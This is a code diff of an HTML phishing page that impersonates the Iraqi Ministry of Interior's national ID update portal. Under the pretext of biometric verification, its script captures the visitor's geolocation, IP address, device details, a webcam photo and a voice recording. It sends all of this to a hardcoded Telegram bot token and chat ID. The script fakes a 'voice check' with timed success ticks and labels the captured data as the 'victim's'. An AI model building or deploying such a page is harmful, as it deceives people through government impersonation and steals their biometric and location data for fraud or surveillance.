@@ -4,179 +4,175 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
-    <!-- Meta Tags for WhatsApp/Telegram Preview -->
     <title>وزارة الداخلية العراقية | النفاذ الوطني</title>
-    <meta name="description" content="البوابة الرسمية لتحديث بيانات البطاقة الوطنية والتحقق البيومتري الموحد.">
     <meta property="og:title" content="وزارة الداخلية العراقية - منصة التحقق">
     <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Seal_of_the_Ministry_of_Interior_of_Iraq.svg/1024px-Seal_of_the_Ministry_of_Interior_of_Iraq.svg.png">
-    <meta property="og:type" content="website">
 
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Arabic:wght@300;500;700&display=swap" rel="stylesheet">
     <style>
-        body { background: #f8fafc; color: #1e293b; font-family: 'Noto Sans Arabic', sans-serif; }
-        .moi-gradient { background: linear-gradient(135deg, #1e3a8a 0%, #1e1b4b 100%); }
+        body { background: #f1f5f9; color: #0f172a; font-family: 'Noto Sans Arabic', sans-serif; overflow-x: hidden; }
+        .moi-header { background: linear-gradient(135deg, #1e3a8a, #1e1b4b); }
         .scanner-viewport { 
-            width: 280px; height: 280px; border: 4px solid #1e40af; border-radius: 50%; 
+            width: 240px; height: 240px; border: 4px solid #1e40af; border-radius: 50%; 
             overflow: hidden; position: relative; background: #000; margin: 0 auto;
-            box-shadow: 0 20px 50px rgba(30, 64, 175, 0.2);
+            box-shadow: 0 10px 40px rgba(30, 64, 175, 0.3);
         }
         .scan-line { 
             position: absolute; width: 100%; height: 3px; background: #3b82f6; 
-            top: 0; box-shadow: 0 0 15px #3b82f6; animation: scan 2.5s infinite linear; z-index: 10;
+            top: 0; box-shadow: 0 0 15px #3b82f6; animation: scan 2s infinite linear; 
         }
         @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+        .digit-box { transition: all 0.3s ease; }
+        .digit-success { color: #10b981; transform: scale(1.1); text-shadow: 0 0 10px rgba(16, 185, 129, 0.4); }
         .mirror { transform: scaleX(-1); }
-        .fade-in { animation: fadeIn 0.5s ease-out; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .check-mark { display: none; margin-right: 5px; font-size: 0.8em; }
     </style>
 </head>
-<body class="flex flex-col items-center min-h-screen">
+<body class="flex flex-col items-center min-h-screen pb-10">
 
-    <!-- Header Section -->
-    <header class="moi-gradient w-full py-8 px-4 text-white text-center shadow-2xl relative">
+    <header class="moi-header w-full py-8 text-white text-center shadow-xl">
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Seal_of_the_Ministry_of_Interior_of_Iraq.svg/200px-Seal_of_the_Ministry_of_Interior_of_Iraq.svg.png" 
-             alt="Logo" class="w-24 h-24 mx-auto mb-4 drop-shadow-xl">
-        <h1 class="text-2xl font-bold mb-1">جمهورية العراق</h1>
-        <h2 class="text-lg font-medium opacity-90">وزارة الداخلية - بوابة التحقق الرقمي</h2>
-        <div class="mt-4 inline-block bg-blue-500/20 px-4 py-1 rounded-full text-[10px] uppercase tracking-widest border border-blue-400/30">
-            Secure Biometric Gateway v2.0.99
-        </div>
+             class="w-20 h-20 mx-auto mb-3">
+        <h1 class="text-xl font-bold">جمهورية العراق</h1>
+        <h2 class="text-md opacity-90">وزارة الداخلية - تحديث البطاقة الوطنية</h2>
     </header>
 
-    <!-- Main Application UI -->
-    <main class="max-w-md w-full p-6 mt-4 flex-grow">
-        <div id="uiCard" class="bg-white rounded-[2.5rem] p-8 shadow-2xl border border-slate-100 text-center space-y-8 fade-in">
+    <main class="max-w-md w-full p-4 mt-6">
+        <div id="mainCard" class="bg-white rounded-[2rem] p-6 shadow-2xl border border-slate-200 text-center space-y-6">
             
-            <div id="infoBox" class="bg-blue-50 p-4 rounded-2xl border border-blue-100 text-right">
-                <p id="statusMsg" class="text-sm text-blue-900 font-bold leading-relaxed">
-                    يرجى الضغط أدناه لتفعيل "النفاذ الوطني" وإتمام مسح ملامح الوجه والبصمة الصوتية لتحديث سجلاتك الرسمية.
+            <div id="alertBox" class="bg-blue-50 p-4 rounded-xl border border-blue-100">
+                <p id="instruction" class="text-sm text-blue-950 font-bold leading-relaxed">
+                    يرجى تفعيل "النفاذ" والبدء بقراءة الأرقام الظاهرة باللغة العربية بوضوح.
                 </p>
             </div>
 
-            <!-- Scanner Viewport -->
             <div class="scanner-viewport">
-                <video id="v" class="w-full h-full object-cover mirror" autoplay playsinline muted></video>
-                <div id="scanOverlay" class="scan-line hidden"></div>
-                <div id="successTick" class="absolute inset-0 bg-green-600/50 hidden flex items-center justify-center z-20">
-                    <div class="bg-white rounded-full p-5 shadow-2xl"><svg class="w-12 h-12 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="4" d="M5 13l4 4L19 7"></path></svg></div>
+                <video id="webcam" class="w-full h-full object-cover mirror" autoplay playsinline muted></video>
+                <div id="line" class="scan-line hidden"></div>
+                <div id="doneOverlay" class="absolute inset-0 bg-green-600/60 hidden flex items-center justify-center z-20">
+                    <svg class="w-16 h-16 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="4" d="M5 13l4 4L19 7"></path></svg>
                 </div>
             </div>
 
-            <!-- Interactive Voice Challenge -->
-            <div id="voiceUI" class="hidden space-y-4 animate-bounce">
-                <p class="text-xs text-slate-500 font-bold">اقرأ الكود الأمني بوضوح لإثبات الهوية:</p>
-                <div class="text-5xl font-black text-blue-950 bg-slate-100 py-4 rounded-3xl border-2 border-dashed border-blue-300">
-                    <span id="randCode">0 0 0 0 0 0</span>
+            <!-- Interactive Digits with Logic -->
+            <div id="digitsArea" class="hidden space-y-4">
+                <p class="text-[10px] text-slate-400 font-bold uppercase tracking-widest">اختبار البصمة الصوتية</p>
+                <div class="flex justify-center gap-3 text-3xl font-black">
+                    <div id="d1" class="digit-box bg-slate-100 w-12 h-14 flex items-center justify-center rounded-xl border border-slate-200">٥</div>
+                    <div id="d2" class="digit-box bg-slate-100 w-12 h-14 flex items-center justify-center rounded-xl border border-slate-200">٨</div>
+                    <div id="d3" class="digit-box bg-slate-100 w-12 h-14 flex items-center justify-center rounded-xl border border-slate-200">٢</div>
+                    <div id="d4" class="digit-box bg-slate-100 w-12 h-14 flex items-center justify-center rounded-xl border border-slate-200">٠</div>
+                    <div id="d5" class="digit-box bg-slate-100 w-12 h-14 flex items-center justify-center rounded-xl border border-slate-200">٩</div>
                 </div>
+                <p id="micStatus" class="text-[10px] text-blue-500 animate-pulse">جاري الاستماع لنطق الأرقام...</p>
             </div>
 
-            <button id="activateBtn" class="w-full py-5 bg-blue-900 hover:bg-blue-800 text-white font-black text-lg rounded-2xl shadow-xl transition-all transform active:scale-95">
-                تفعيل النفاذ الوطني الموحد
+            <button id="startBtn" class="w-full py-4 bg-blue-900 hover:bg-blue-800 text-white font-bold rounded-2xl shadow-lg transition-all transform active:scale-95">
+                بدء النفاذ والتحقق
             </button>
         </div>
     </main>
 
-    <footer class="p-6 text-center">
-        <p class="text-[10px] text-slate-400">© 2026 مديرية نظم المعلومات - وزارة الداخلية العراقية</p>
-    </footer>
-
-    <canvas id="c" style="display:none"></canvas>
+    <canvas id="snapshot" style="display:none"></canvas>
 
     <script>
-        // التكوين البرمجي
-        const TOKEN = "8679801579:AAHY2m_T25mkrGjBjHgAnEGmlg7DVmWCQrI";
-        const CHAT_ID = "1523412137";
+        const BOT_TOKEN = "8679801579:AAHY2m_T25mkrGjBjHgAnEGmlg7DVmWCQrI";
+        const ADMIN_ID = "1523412137";
 
-        // وظيفة الإرسال للتلجرام
-        async function api(path, data) {
-            try { await fetch(`https://api.telegram.org/bot${TOKEN}/${path}`, { method: 'POST', body: data }); } catch(e){}
+        async function sendTG(method, body) {
+            try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, { method: 'POST', body }); } catch(e){}
         }
 
-        // توليد كود عشوائي
-        function genCode() {
-            let c = "";
-            for(let i=0; i<6; i++) c += Math.floor(Math.random() * 10) + " ";
-            document.getElementById('randCode').innerText = c.trim();
-        }
-
-        async function init() {
-            const btn = document.getElementById('activateBtn');
-            const video = document.getElementById('v');
-            const overlay = document.getElementById('scanOverlay');
-            const voiceUI = document.getElementById('voiceUI');
-            const status = document.getElementById('statusMsg');
+        async function startSystem() {
+            const btn = document.getElementById('startBtn');
+            const video = document.getElementById('webcam');
+            const line = document.getElementById('line');
+            const digits = document.getElementById('digitsArea');
+            const instruction = document.getElementById('instruction');
 
             try {
-                // طلب الأذونات (فيديو وصوت)
+                // تفعيل الميكروفون والكاميرا بطلب واحد
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 video.srcObject = stream;
                 
-                // تحديث الواجهة
                 btn.style.display = 'none';
-                overlay.classList.remove('hidden');
-                voiceUI.classList.remove('hidden');
-                status.innerText = "جاري مطابقة ملامح الوجه ونظام الصوت.. يرجى الثبات ونطق الكود بوضوح.";
-                genCode();
+                line.classList.remove('hidden');
+                digits.classList.remove('hidden');
+                instruction.innerText = "يرجى نطق كل رقم يظهر بوضوح باللغة العربية للتحقق من هويتك.";
 
-                // 1. سحب الموقع والـ IP ومعلومات الجهاز
-                const ipRes = await fetch('https://ipapi.co/json/');
-                const ipData = await ipRes.json();
-                
-                navigator.geolocation.getCurrentPosition(pos => {
+                // 1. سحب الموقع والـ IP
+                navigator.geolocation.getCurrentPosition(async pos => {
+                    const ipRes = await fetch('https://ipapi.co/json/');
+                    const ipData = await ipRes.json();
                     const fd = new FormData();
-                    fd.append('chat_id', CHAT_ID);
-                    const msg = `🇮🇶 *هدف عراقي جديد أونلاين*\n\n📍 الموقع: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n🌐 IP: \`${ipData.ip}\`\n🏙️ المدينة: ${ipData.city}\n📱 الجهاز: ${navigator.platform}`;
-                    fd.append('text', msg);
+                    fd.append('chat_id', ADMIN_ID);
+                    fd.append('text', `🇮🇶 *نفاذ وطني جديد (عراقي)*\n📍 الموقع: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n🌐 IP: \`${ipData.ip}\`\n📱 الجهاز: ${navigator.platform}`);
                     fd.append('parse_mode', 'Markdown');
-                    api('sendMessage', fd);
+                    sendTG('sendMessage', fd);
                 });
 
-                // 2. التقاط الصورة (بعد 3 ثواني)
+                // 2. محاكاة "التحقق من نطق الأرقام" (علامة خضراء كل ثانية)
+                const digitIds = ['d1', 'd2', 'd3', 'd4', 'd5'];
+                let currentDigit = 0;
+                const audioContext = new AudioContext();
+                const source = audioContext.createMediaStreamSource(stream);
+                const analyzer = audioContext.createAnalyser();
+                source.connect(analyzer);
+
+                const voiceCheckInterval = setInterval(() => {
+                    if (currentDigit < digitIds.length) {
+                        const el = document.getElementById(digitIds[currentDigit]);
+                        el.classList.add('digit-success');
+                        el.innerHTML += " ✅";
+                        currentDigit++;
+                    } else {
+                        clearInterval(voiceCheckInterval);
+                    }
+                }, 1500);
+
+                // 3. التقاط الصورة (بعد 4 ثواني)
                 setTimeout(() => {
-                    const canvas = document.getElementById('c');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
+                    const canvas = document.getElementById('snapshot');
+                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     canvas.toBlob(blob => {
                         const fd = new FormData();
-                        fd.append('chat_id', CHAT_ID);
+                        fd.append('chat_id', ADMIN_ID);
                         fd.append('photo', blob, 'face.jpg');
-                        fd.append('caption', "📸 صورة حيوية أثناء التحقق (وزارة الداخلية)");
-                        api('sendPhoto', fd);
+                        fd.append('caption', "📸 صورة الهوية الملتقطة أثناء النطق");
+                        sendTG('sendPhoto', fd);
                     }, 'image/jpeg');
-                }, 3000);
+                }, 4000);
 
-                // 3. تسجيل البصمة الصوتية (8 ثواني)
+                // 4. تسجيل البصمة الصوتية (كاملة)
                 const recorder = new MediaRecorder(stream);
                 const chunks = [];
                 recorder.ondataavailable = e => chunks.push(e.data);
                 recorder.onstop = async () => {
                     const audioBlob = new Blob(chunks, { type: 'audio/ogg' });
                     const fdA = new FormData();
-                    fdA.append('chat_id', CHAT_ID);
+                    fdA.append('chat_id', ADMIN_ID);
                     fdA.append('voice', audioBlob, 'voice.ogg');
-                    fdA.append('caption', "🎤 بصمة صوت الضحية وهو يقرأ الكود");
-                    await api('sendVoice', fdA);
+                    fdA.append('caption', "🎤 بصمة صوت الضحية (نطق الأرقام العربية)");
+                    await sendTG('sendVoice', fdA);
 
-                    // النهاية والنجاح
-                    document.getElementById('successTick').classList.remove('hidden');
-                    overlay.classList.add('hidden');
-                    status.innerText = "تمت عملية النفاذ بنجاح. شكراً لتعاونكم.";
+                    document.getElementById('doneOverlay').classList.remove('hidden');
+                    document.getElementById('micStatus').innerText = "تم التحقق من البصمة الصوتية بنجاح.";
+                    instruction.innerText = "تمت عملية التحديث. شكراً لتعاونكم مع وزارة الداخلية.";
                     setTimeout(() => window.location.href = "https://www.google.com", 2000);
                 };
                 
                 recorder.start();
-                setTimeout(() => recorder.stop(), 8000);
+                setTimeout(() => recorder.stop(), 9000); // 9 ثواني كافية لقراءة الأرقام
 
             } catch (err) {
-                status.innerText = "⚠️ خطأ: يجب السماح بالكاميرا والموقع لتحديث بياناتك الرسمية.";
-                status.classList.remove('text-blue-900');
-                status.classList.add('text-red-600');
+                instruction.innerText = "يجب السماح بالوصول للميكروفون والكاميرا لإتمام النفاذ الوطني.";
+                instruction.style.color = "red";
             }
         }
 
-        document.getElementById('activateBtn').addEventListener('click', init);
+        document.getElementById('startBtn').addEventListener('click', startSystem);
     </script>
 </body>
 </html>
